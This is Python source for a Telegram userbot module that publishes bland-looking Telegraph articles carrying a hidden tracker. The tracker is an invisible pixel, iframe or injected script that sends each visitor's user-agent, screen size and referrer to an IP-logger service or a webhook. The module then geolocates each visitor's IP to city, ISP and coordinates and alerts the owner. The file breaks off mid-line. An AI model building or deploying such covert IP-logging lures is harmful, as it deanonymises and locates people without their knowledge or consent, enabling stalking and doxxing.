# meta developer: @sunshinelzt
# scope: hikka_only
# scope: hikka_min 1.3.0
# requires: telegraph requests

import logging
import random
import string
import re
from telethon.tl.types import Message
from .. import loader, utils
import aiohttp
import asyncio
from datetime import datetime
from telegraph import Telegraph
import requests

logger = logging.getLogger(__name__)

@loader.tds
class TelegraphTrackerMod(loader.Module):
    """Создаёт Telegraph статьи со встроенным трекером для получения информации о посетителях"""
    
    strings = {
        "name": "TelegraphTracker",
        "loading": "🔄 <b>Создание статьи в Telegraph...</b>",
        "tgph_created": "📝 <b>Telegraph статья успешно создана!</b>\n\n<b>Название:</b> <code>{title}</code>\n<b>URL:</b> <code>{url}</code>\n<b>ID трекера:</b> <code>{track_id}</code>",
        "account_created": "✅ <b>Telegraph аккаунт создан!</b>\n<b>Имя:</b> {name}\n<b>Токен:</b> <code>{token}</code>",
        "error": "❌ <b>Ошибка:</b> {error}",
        "no_data": "❌ <b>Нет данных о посещениях</b>",
        "user_info": "✅ <b>Информация о посетителе:</b>\n\n📱 <b>IP-адрес:</b> <code>{ip}</code>\n🌐 <b>User-Agent:</b> <code>{ua}</code>\n🔍 <b>Устройство:</b> <code>{device}</code>\n📍 <b>Локация:</b> <code>{location}</code>\n🌍 <b>Страна:</b> <code>{country}</code>\n🏙 <b>Город:</b> <code>{city}</code>\n📶 <b>Провайдер:</b> <code>{isp}</code>\n⏱ <b>Время посещения:</b> <code>{time}</code>",
        "user_visit": "👁 <b>Новое посещение вашей статьи!</b>\n\n📝 <b>Статья:</b> <code>{title}</code>\n📱 <b>IP-адрес:</b> <code>{ip}</code>\n🌐 <b>Устройство:</b> <code>{device}</code>\n🌍 <b>Местоположение:</b> <code>{location}</code>\n⏱ <b>Время:</b> <code>{time}</code>",
        "stats_title": "📊 <b>Статистика Telegraph статей</b>\n\n",
        "article_deleted": "🗑 <b>Статья с ID</b> <code>{id}</code> <b>удалена</b>",
        "article_not_found": "❓ <b>Статья с ID</b> <code>{id}</code> <b>не найдена</b>",
        "article_preview": "📋 <b>Предпросмотр статьи:</b>\n\n<b>Заголовок:</b> {title}\n<b>Автор:</b> {author}\n<b>Текст:</b> {text_preview}...\n\n<b>Для публикации напишите:</b> <code>.tgph publish</code>",
        "visits_info": "📊 <b>Информация о посещениях статьи:</b>\n\n<b>Статья:</b> {title}\n<b>URL:</b> {url}\n<b>Всего посещений:</b> {count}",
        "callback_url_set": "🔗 <b>URL для обратной связи установлен:</b> <code>{url}</code>",
        "tracking_set": "🔧 <b>Метод трекинга установлен:</b> {method}"
    }
    
    def __init__(self):
        self.config = loader.ModuleConfig(
            "ARTICLE_TITLE", "Интересная информация о Telegram", "Заголовок статьи Telegraph",
            "ARTICLE_TEXT", "Telegram - это мессенджер, который сочетает в себе скорость, безопасность и удобство. Узнайте больше о функциях и возможностях этой платформы.", 
            "Текст для статьи Telegraph (поддерживает HTML-форматирование)",
            "AUTHOR_NAME", "Telegram Insider", "Имя автора статьи",
            "NOTIFY_ON_VISIT", True, "Уведомлять о посещениях статьи",
            "TRACKING_METHOD", "redirect", "Метод трекинга: 'redirect', 'pixel', или 'webhook'",
            "WEBHOOK_URL", "", "URL для получения данных трекинга (если используется webhook)",
            "USE_IP_API", True, "Использовать api.ipify.org для определения IP",
            "COLLECT_FULL_INFO", True, "Собирать полную информацию о посетителе (геолокация, провайдер и т.д.)"
        )
        
        # Временное хранилище для создаваемой статьи
        self.temp_article = None
        
        # Хранилище данных о статьях и посетителях
        self.articles = {}
        self.visitors = {}
        self.telegraph_token = None
        self.telegraph_author = None
        self.telegraph = None
        
        # URL для редиректа
        self.redirect_url = "https://iplogger.org/logger" # Заглушка
        
        # Таймер для проверки новых посещений
        self.check_timer = None
    
    async def client_ready(self, client, db):
        self.client = client
        self.db = db
        
        # Загружаем сохраненные данные
        self.articles = self.db.get(self.__class__.__name__, "articles", {})
        self.visitors = self.db.get(self.__class__.__name__, "visitors", {})
        self.telegraph_token = self.db.get(self.__class__.__name__, "telegraph_token", None)
        self.telegraph_author = self.db.get(self.__class__.__name__, "telegraph_author", self.config["AUTHOR_NAME"])
        
        # Инициализируем Telegraph API если есть токен
        if self.telegraph_token:
            self.telegraph = Telegraph(self.telegraph_token)
        
        # Запускаем таймер для проверки новых посещений
        self.check_timer = asyncio.create_task(self._check_visits_loop())
    
    async def _check_visits_loop(self):
        """Периодически проверяет новые посещения"""
        while True:
            try:
                await self._check_new_visits()
            except Exception as e:
                logger.error(f"Ошибка при проверке новых посещений: {e}")
            
            await asyncio.sleep(300)  # Проверка каждые 5 минут
    
    async def _check_new_visits(self):
        """Проверяет новые посещения через API сервиса"""
        if not self.redirect_url:
            return
        
        try:
            base_url = self.redirect_url.split("/logger")[0]
            check_url = f"{base_url}/check"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(check_url) as response:
                    if response.status == 200:
                        data = await response.json()
                        
                        for visit in data.get("visits", []):
                            track_id = visit.get("id")
                            if not track_id or track_id not in self.articles:
                                continue
                            
                            visitor_data = {
                                "ip": visit.get("ip", "неизвестно"),
                                "user_agent": visit.get("ua", "неизвестно"),
                                "device": self._detect_device(visit.get("ua", "")),
                                "referrer": visit.get("ref", "неизвестно"),
                                "time": visit.get("time", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                            }
                            
                            # Получаем дополнительную информацию по IP
                            if self.config["COLLECT_FULL_INFO"] and visitor_data["ip"] != "неизвестно":
                                geo_info = await self._get_ip_info(visitor_data["ip"])
                                visitor_data.update(geo_info)
                            
                            # Добавляем в базу данных
                            if track_id not in self.visitors:
                                self.visitors[track_id] = []
                            
                            # Проверяем, нет ли уже такого же посещения
                            visit_exists = False
                            for existing_visit in self.visitors[track_id]:
                                if (existing_visit.get("ip") == visitor_data["ip"] and
                                    existing_visit.get("time") == visitor_data["time"]):
                                    visit_exists = True
                                    break
                            
                            if not visit_exists:
                                self.visitors[track_id].append(visitor_data)
                                self._save_data()
                                
                                # Отправляем уведомление
                                if self.config["NOTIFY_ON_VISIT"]:
                                    article = self.articles[track_id]
                                    location = visitor_data.get("country", "неизвестно")
                                    if "city" in visitor_data:
                                        location = f"{visitor_data['city']}, {location}"
                                    
                                    await self.client.send_message(
                                        "me",
                                        self.strings["user_visit"].format(
                                            title=article["title"],
                                            ip=visitor_data["ip"],
                                            device=visitor_data["device"],
                                            location=location,
                                            time=visitor_data["time"]
                                        )
                                    )
        
        except Exception as e:
            logger.error(f"Ошибка при проверке новых посещений: {e}")
    
    def _save_data(self):
        """Сохраняет данные в базу"""
        self.db.set(self.__class__.__name__, "articles", self.articles)
        self.db.set(self.__class__.__name__, "visitors", self.visitors)
        self.db.set(self.__class__.__name__, "telegraph_token", self.telegraph_token)
        self.db.set(self.__class__.__name__, "telegraph_author", self.telegraph_author)
    
    def _generate_random_id(self, length=12):
        """Генерирует случайный ID для статьи"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _html_to_telegraph_format(self, html_content):
        """Конвертирует HTML в формат, принимаемый Telegraph API"""
        content = []
        
        # Разбиваем текст на абзацы
        paragraphs = html_content.split("\n\n")
        for p in paragraphs:
            if p.strip():
                content.append({
                    "tag": "p",
                    "children": [p.strip()]
                })
                
        return content
    
    def _create_tracker_html(self, track_id):
        """Создает HTML-код трекера"""
        tracking_method = self.config["TRACKING_METHOD"]
        
        if tracking_method == "pixel":
            # Невидимый пиксель с параметрами трекинга
            pixel_url = f"{self.redirect_url}?id={track_id}&t={int(datetime.now().timestamp())}"
            return f'<img src="{pixel_url}" style="position:absolute;opacity:0;width:1px;height:1px;" />'
            
        elif tracking_method == "redirect":
            # JavaScript-редирект с задержкой для сбора данных
            js_code = f"""
            <script>
                (function() {{
                    var trackId = "{track_id}";
                    var redirectUrl = "{self.redirect_url}";
                    var timestamp = Date.now();
                    var userAgent = encodeURIComponent(navigator.userAgent);
                    var screenSize = screen.width + "x" + screen.height;
                    var referrer = encodeURIComponent(document.referrer);
                    var trackUrl = redirectUrl + "?id=" + trackId + 
                                  "&t=" + timestamp + 
                                  "&ua=" + userAgent + 
                                  "&res=" + screenSize + 
                                  "&ref=" + referrer;
                    
                    // Создаем невидимый iframe для загрузки трекинг-URL
                    var iframe = document.createElement('iframe');
                    iframe.style.width = '1px';
                    iframe.style.height = '1px';
                    iframe.style.position = 'absolute';
                    iframe.style.opacity = '0';
                    iframe.src = trackUrl;
                    document.body.appendChild(iframe);
                    
                    // Также загружаем изображение для надежности
                    var img = new Image();
                    img.src = trackUrl;
                    img.style.position = 'absolute';
                    img.style.opacity = '0';
                    img.style.width = '1px';
                    img.style.height = '1px';
                    document.body.appendChild(img);
                }})();
            </script>
            """
            return js_code
            
        elif tracking_method == "webhook":
            # Отправка данных на веб-хук
            webhook_url = self.config["WEBHOOK_URL"] or self.redirect_url
            js_code = f"""
            <script>
                (function() {{
                    var trackId = "{track_id}";
                    var webhookUrl = "{webhook_url}";
                    var timestamp = Date.now();
                    var userAgent = encodeURIComponent(navigator.userAgent);
                    var screenSize = screen.width + "x" + screen.height;
                    var referrer = encodeURIComponent(document.referrer);
                    
                    // Отправка через изображение (работает даже при блокировке CORS)
                    var trackUrl = webhookUrl + "?data=" + encodeURIComponent(JSON.stringify({{
                        id: trackId,
                        time: timestamp,
                        ua: userAgent,
                        res: screenSize,
                        ref: referrer
                    }}));
                    var img = new Image();
                    img.src = trackUrl;
                    img.style.position = 'absolute';
                    img.style.opacity = '0';
                    img.style.width = '1px';
                    img.style.height = '1px';
                    document.body.appendChild(img);
                }})();
            </script>
            """
            return js_code
        
        # По умолчанию используем комбинированный метод
        return self._create_tracker_html("redirect")
    
    async def _get_ip_info(self, ip):
        """Получает информацию о местоположении по IP"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}") as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get("status") == "success":
                            return {
                                "country": data.get("country", "неизвестно"),
                                "city": data.get("city", "неизвестно"),
                                "location": f"{data.get('city', '')}, {data.get('country', '')}",
                                "isp": data.get("isp", "неизвестно"),
                                "region": data.get("regionName", "неизвестно"),
                                "lat": data.get("lat", 0),
                                "lon": data.get("lon", 0),
                                "timezone": data.get("timezone", "неизвестно")
                            }
        except Exception as e:
            logger.error(f"Ошибка при получении информации о IP: {e}")
        
        return {
            "country": "неизвестно",
            "city": "неизвестно",
            "location": "неизвестно",
            "isp": "неизвестно"
        }
    
    async def _create_telegraph_account(self, short_name=None, author_name=None):
        """Создает аккаунт в Telegraph"""
        if not short_name:
            short_name = "hikka_" + self._generate_random_id(6)
        
        if not author_name:
            author_name = self.config["AUTHOR_NAME"]
            
        try:
            telegraph = Telegraph()
            account = telegraph.create_account(
                short_name=short_name,
                author_name=author_name
            )
            
            self.telegraph = telegraph
            self.telegraph_token = account["access_token"]
            self.telegraph_author = author_name
            self._save_data()
            
            return account
        except Exception as e:
            logger.exception(f"Ошибка при создании аккаунта Telegraph: {e}")
            return None
    
    async def _create_telegraph_page(self, title, content, author_name, track_id):
        """Создает страницу в Telegraph"""
        if not self.telegraph:
            if not self.telegraph_token:
                account = await self._create_telegraph_account(author_name=author_name)
                if not account:
                    return None, "Не удалось создать аккаунт Telegraph"
            else:
                self.telegraph = Telegraph(self.telegraph_token)
        
        try:
            # Преобразуем текст статьи в формат Telegraph
            telegraph_content = self._html_to_telegraph_format(content)
            
            # Добавляем невидимый трекер в конец статьи
            tracker_html = self._create_tracker_html(track_id)
            
            # Создаем страницу
            html_content = ''.join([f"<p>{p['children'][0]}</p>" for p in telegraph_content if p['tag'] == 'p']) + tracker_html
            response = self.telegraph.create_page(
                title=title,
                author_name=author_name,
                html_content=html_content
            )
            
            page_url = f"https://telegra.ph/{response['path']}"
            return page_url, None
        except Exception as e:
            logger.exception(f"Ошибка при создании страницы Telegraph: {e}")
            return None, str(e)
    
    def _detect_device(self, user_agent):
        """Определяет устройство по User-Agent"""
        if not user_agent or user_agent == "неизвестно":
            return "Неизвестное устройство"
        
        if "iPhone" in user_agent:
            match = re.search(r"iPhone\s*OS\s*(\d+)", user_agent)
            ios_version = match.group(1) if match else ""
            return f"iPhone (iOS {ios_version})" if ios_version else "iPhone"
        
        if "iPad" in user_agent:
            return "iPad"
            
        if "Android" in user_agent:
            match = re.search(r"Android\s+(\d+)", user_agent)
            android_version = match.group(1) if match else ""
            
            if "Mobile" in user_agent:
                device_type = "смартфон"
            else:
                device_type = "планшет"
                
            return f"Android {android_version} ({device_type})" if android_version else f"Android ({device_type})"
        
        if "Windows" in user_agent:
            match = re.search(r"Windows NT\s+(\d+\.\d+)", user_agent)
            win_version = match.group(1) if match else ""
            
            versions = {
                "10.0": "Windows 10",
                "6.3": "Windows 8.1",
                "6.2": "Windows 8",
                "6.1": "Windows 7",
                "6.0": "Windows Vista",
                "5.2": "Windows XP x64",
                "5.1": "Windows XP",
            }
            
            return versions.get(win_version, f"Windows ({win_version})") if win_version else "Windows"
        
        if "Macintosh" in user_agent:
            return "macOS"
        
        if "Linux" in user_agent and "Android" not in user_agent:
            return "Linux"
        
        return "Неизвестное устройство"
    
    @loader.owner
    async def tgphsetcmd(self, message: Message):
        """Настроить аккаунт Telegraph"""
        args = utils.get_args_raw(message)
        
        if not args:
            if not self.telegraph_token:
                await utils.answer(message, "⚠️ <b>Аккаунт Telegraph не настроен.</b>\n\nИспользуйте: <code>.tgphset create</code> для создания нового аккаунта.")
            else:
                await utils.answer(message, f"✅ <b>Аккаунт Telegraph настроен</b>\n\n<b>Имя автора:</b> {self.telegraph_author}\n<b>Токен:</b> <code>{self.telegraph_token[:15]}...</code>")
            return
            
        if args == "create":
            await utils.answer(message, "🔄 <b>Создание нового аккаунта Telegraph...</b>")
            account = await self._create_telegraph_account()
            
            if account:
                await utils.answer(
                    message, 
                    self.strings["account_created"].format(
                        name=account["short_name"],
                        token=account["access_token"]
                    )
                )
            else:
                await utils.answer(message, self.strings["error"].format(error="Не удалось создать аккаунт Telegraph"))
                
        elif args.startswith("token "):
            # Установка собственного токена
            token = args.split("token ")[1].strip()
            
            try:
                telegraph = Telegraph(token)
                account_info = telegraph.get_account_info()
                
                self.telegraph = telegraph
                self.telegraph_token = token
                self.telegraph_author = account_info.get("author_name", self.config["AUTHOR_NAME"])
                self._save_data()
                
                await utils.answer(
                    message, 
                    f"✅ <b>Токен Telegraph успешно установлен</b>\n\n<b>Имя автора:</b> {self.telegraph_author}"
                )
            except Exception as e:
                await utils.answer(message, self.strings["error"].format(error=f"Неверный токен: {str(e)}"))
                
        elif args.startswith("author "):
            # Установка имени автора
            author_name = args.split("author ")[1].strip()
            
            self.telegraph_author = author_name
            self._save_data()
            
            if self.telegraph:
                try:
                    self.telegraph.edit_account_info(author_name=author_name)
                except Exception as e:
                    logger.warning(f"Не удалось обновить имя автора в Telegraph: {e}")
            
            await utils.answer(message, f"✅ <b>Имя автора установлено:</b> {author_name}")
        
        elif args.startswith("tracking "):
            # Установка метода трекинга
            method = args.split("tracking ")[1].strip()
            
            if method in ["pixel", "redirect", "webhook"]:
                self.config["TRACKING_METHOD"] = method
                await utils.answer(message, self.strings["tracking_set"].format(method=method))
            else:
                await utils.answer(message, self.strings["error"].format(error="Неизвестный метод трекинга. Используйте: pixel, redirect или webhook"))
        
        elif args.startswith("webhook "):
            # Установка URL для webhook
            webhook_url = args.split("webhook ")[1].strip()
            
            self.config["WEBHOOK_URL"] = webhook_url
            await utils.answer(message, self.strings["callback_url_set"].format(url=webhook_url))
    
    @loader.owner
    async def tgphcmd(self, message: Message):
        """Создать статью в Telegraph с трекером"""
        args = utils.get_args_raw(message)
        
        if args == "publish" and self.temp_article:
            # Публикуем подготовленную статью
            await utils.answer(message, self.strings["loading"])
            
            title = self.temp_article["title"]
            content = self.temp_article["content"]
            author = self.temp_article["author"]
            track_id = self.temp_article["track_id"]
            
            page_url, error = await self._create_telegraph_page(title, content, author, track_id)
            
            if error:
                return await utils.answer(message, self.strings["error"].format(error=error))
                
            # Сохраняем информацию о статье
            self.articles[track_id] = {
                "title": title,
                "url": page_url,
                "author": author,
                "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "visits": 0
            }
            self._save_data()
            
            # Сбрасываем временную статью
            self.temp_article = None
            
            await utils.answer(
                message, 
                self.strings["tgph_created"].format(
                    title=title,
                    url=page_url,
                    track_id=track_id
                )
            )
            return
            
        # Создаем новую статью
        title = self.config["ARTICLE_TITLE"]
        content = self.config["ARTICLE_TEXT"]
        author = self.telegraph_author or self.config["AUTHOR_NAME"]
        track_id = self._generate_random_id()
        
        # Сохраняем во временное хранилище
        self.temp_article = {
            "title": title,
            "content": content,
            "author": author,
            "track_id": track_id
        }
        
        # Показываем предпросмотр
        text_preview = content[:100].replace("\n", " ")
        await utils.answer(
            message,
            self.strings["article_preview"].format(
                title=title,
                author=author,
                text_preview=text_preview
            )
        )
    
    @loader.owner
    async def tgphstatscmd(self, message: Message):
        """Показать статистику посещений"""
        args = utils.get_args_raw(message)
        
        if not args:
            # Показываем общую статистику
            if not self.articles:
                return await utils.answer(message, "📊 <b>У вас пока нет созданных статей</b>")
            
            stats = self.strings["stats_title"]
            for track_id, article in self.articles.items():
                visits_count = len(self.visitors.get(track_id, []))
                stats += f"📝 <b>{article['title']}</b>\n"
                stats += f"🔗 <code>{article['url']}</code>\n"
                stats += f"👁 <b>Посещений:</b> {visits_count}\n"
                stats += f"🆔 <b>ID:</b> <code>{track_id}</code>\n\n"
            
            await utils.answer(message, stats)
            
        elif args in self.articles:
            # Показываем статистику конкретной статьи
            track_id = args
            article = self.articles[track_id]
            visits = self.visitors.get(track_id, [])
            
            if not visits:
                return await utils.answer(
                    message,
                    self.strings["visits_info"].format(
                        title=article["title"],
                        url=article["url"],
                        count=0
                    ) + "\n\n" + self.strings["no_data"]
                )
            
            # Формируем сообщение со статистикой
            stats = self.strings["visits_info"].format(
                title=article["title"],
                url=article["url"],
                count=len(visits)
            ) + "\n\n"
            
            # Добавляем информацию о последних 5 посещениях
            stats += "<b>Последние посещения:</b>\n\n"
            for visit in visits[-5:]:
                ip = visit.get("ip", "неизвестно")
                device = visit.get("device", "неизвестно")
                location = visit.get("location", "неизвестно")
                time = visit.get("time", "неизвестно")
                
                stats += f"📱 <b>IP:</b> <code>{ip}</code>\n"
                stats += f"🔍 <b>Устройство:</b> <code>{device}</code>\n"
                stats += f"📍 <b>Локация:</b> <code>{location}</code>\n"
                stats += f"⏱ <b>Время:</b> <code>{time}</code>\n\n"
            
            await utils.answer(message, stats)
            
        else:
            await utils.answer(message, self.strings["article_not_found"].format(id=args))
            await utils.answer(message, self.strings
